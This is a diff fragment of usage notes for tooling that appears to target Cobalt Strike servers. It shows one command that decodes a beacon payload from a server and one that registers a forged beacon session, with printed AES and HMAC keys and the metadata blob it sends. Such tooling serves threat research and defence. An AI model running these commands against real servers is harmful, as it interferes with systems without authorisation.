@@ -23,4 +23,20 @@ $ python3 ./stager-decode.py -d 10.0.2.15 -o debug/beacon34v3.bin
 [*] Initial Key: 0x66c20f4e
 [*] DLL Size: 213504
 [+] Beacon decoded and written to: debug/beacon34v3.bin
+
+$ python3 ./register.py -t 10.0.2.15 -u neo -c kali -i 1.2.3.4 -p 1 --pid 12345 -k MIG...IDAQAB -v3
+raw AES key: 60b9dfe7b5806f01
+raw HMAC key: 44adeddc44547b7e
+AES key: 441bbd3de3d52997298a8625def8f40c
+HMAC key: 1ede48669d4346c0b0cf2ca15e498c10
+ver: 6.2
+host: 1.2.3.4
+computer: kali
+user: neo
+pid: 12345
+id: 1069220239
+barch: x86
+is64: 1
+Sending metadata blob: b'BSC...Sm9MXHG0='
+
 ```
